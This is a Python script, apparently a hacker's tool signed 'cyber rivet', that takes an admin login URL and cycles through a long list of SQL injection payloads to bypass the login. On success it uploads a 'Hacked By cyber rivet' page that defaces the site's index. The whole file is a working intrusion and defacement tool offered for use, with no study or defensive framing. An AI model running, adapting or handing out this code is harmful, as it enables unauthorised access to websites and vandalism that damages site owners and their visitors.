import requests
import time

# Stylish Banner
def print_banner():
    banner = """
    ==================================================
    ███╗   ███╗███████╗██╗ ██████╗██╗  ██╗███████╗
    ████╗ ████║██╔════╝██║██╔════╝██║  ██║██╔════╝
    ██╔████╔██║█████╗  ██║██║     ███████║█████╗
    ██║╚██╔╝██║██╔══╝  ██║██║     ██╔══██║██╔══╝
    ██║ ╚═╝ ██║███████╗██║╚██████╗██║  ██║███████╗
    ╚═╝     ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝

    Made by cyber rivet
    ==================================================
    """
    print(banner)
    time.sleep(2)  # Pause to allow the banner to be read

# Predefined SQL Injection Payloads
payloads = [
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR ''='",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "admin' -- -",
    "admin' OR '1'='1",
    "admin' OR 1=1 --",
    "' OR '1'='1' -- -",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 1=1 --",
    "admin' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' /*",
    "' OR 1=1 -- -",
    "' OR 'x'='x",
    "' OR 'x'='x' --",
    "' OR 1=1/*",
    "' OR '1'='1' /* -",
    "' OR 1=1 -- -",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "admin' #",
    "' OR 'a'='a' --",
    "' OR 1=1 --",
    "' OR 1=1/*",
    "admin' /*",
    "' OR 1=1 -- -",
    "' OR '1'='1' #",
    "' OR 'x'='x' --",
    "' OR 1=1/*",
    "' OR '1'='1' -- -",
    "admin' OR '1'='1'",
    "' OR '1'='1'",
    "' OR 1=1 --",
    "' OR 'a'='a'",
    "' OR 1=1 /*",
    "admin' OR '1'='1' --",
    "' OR '1'='1' --",
    "' OR 1=1/*",
    "' OR '1'='1' --",
    "' OR 1=1 #",
    "' OR 1=1 -- -",
    "admin' --",
    "' OR 1=1 -- -",
    "' OR '1'='1' #",
    "' OR 1=1 -- -",
    "admin' /*",
    "' OR 1=1/*",
    "' OR '1'='1' --",
    "' OR 1=1 /*",
    "' OR '1'='1' /*",
    "' OR 'x'='x' --",
    "' OR 'a'='a' --",
    "' OR 1=1 -- -",
    "' OR 'a'='a' --",
    "' OR 1=1/*",
    "&",
    "^",
    "*",
    "' or ''-",
    "' or '' ",
    "' or ''&",
    "' or ''^",
    "' or ''*",
    "or true--",
    "' or true--",
    "') or true--",
    "') or true--",
    "' or 'x'='x",
    "') or ('x')=('x",
    "')) or (('x'))=(('x",
    "' or 'x'='x",
    "') or ('x')=('x",
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''=",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
    "admin\" --",
    "admin\" #",
    "admin\"/*",
    "admin\" or \"1\"=\"1",
    "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#",
    "admin\" or \"1\"=\"1\"/*",
    "admin\"or 1=1 or \"\"=",
    "admin\" or 1=1",
    "admin\" or 1=1--",
    "admin\" or 1=1#",
    "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1",
    "admin\") or (\"1\"=\"1\"--",
    "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*",
    "admin\") or \"1\"=\"1",
    "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#",
    "admin\") or \"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"7110eda4d09e062aa5e4a390b0a572ac0d2c0220",
    "=="
]

# Defacement HTML page content
defacement_html = """
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <title>Hacked By cyber rivet</title>
    <style type="text/css">
    * {
        margin: 0;
        padding: 0;
    }
    body {
        background: #000;
        color: #0f0;
        padding: 24px;
    }
    p {
        padding: 12px 0;
    }
    .blink{animation:blink 1s infinite}@keyframes blink{to{opacity:.0;}}
    </style>
</head>
<body>
<img src="http://i66.tinypic.com/mlijit.jpg">
<h1>Hacked By cyber rivet<span class="blink">_</span></h1>
<p>Hello Admin/Guest!</p>
<pre>
Your SERVER has been hacked by cyber rivet.
Your SECURITY is still LACKING and there are many HOLES in your SYSTEM.
Nothing deleted, just changed the INDEX page.
PATCH your SYSTEM or we will be back soon!
</pre>

<p>Kind Regards<br><a href="https://www.facebook.com/winhacker.bipin" target="_blank" style="text-decoration:none; color: lime">cyber rivet</a></p>
</body></html>
"""

# Function to check login bypass and upload defacement page
def try_payload(url, username_field, password_field):
    session = requests.Session()

    # Assuming you've identified the correct file upload path in the admin panel
    upload_url = f"{url}/file-upload"  # Change this to the correct path

    for payload in payloads:
        data = {
            username_field: "admin",  # Trying with 'admin' username
            password_field: payload   # Injecting SQLi payload in the password field
        }

        try:
            # Send POST request with payload
            response = session.post(url, data=data)

            # Check if login was successful (simple check by response content)
            if "dashboard" in response.text or "Welcome" in response.text:
                print(f"Successful Payload: {payload}")

                # Trigger defacement if login bypass is successful
                print("Uploading defacement page...")
                deface_page(upload_url, session)
                break  # Stop after finding a successful payload
            else:
                print(f"Failed Payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Function to upload/replace the index page with deface content
def deface_page(upload_url, session):
    try:
        # Assuming a POST request with file content, similar to a file upload form
        files = {'file': ('index.html', defacement_html, 'text/html')}
        response = session.post(upload_url, files=files)

        if response.status_code == 200:
            print("Defacement successful!")
        else:
            print(f"Failed to upload defacement page. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error during defacement: {e}")

# Main function
def main():
    print_banner()  # Display the stylish banner

    # Prompt user for admin login URL
    url = input("Enter the admin login URL: ")

    # Define form field names (usually 'username' and 'password')
    username_field = "username"
    password_field = "password"

    try_payload(url, username_field, password_field)

if __name__ == "__main__":
    main()
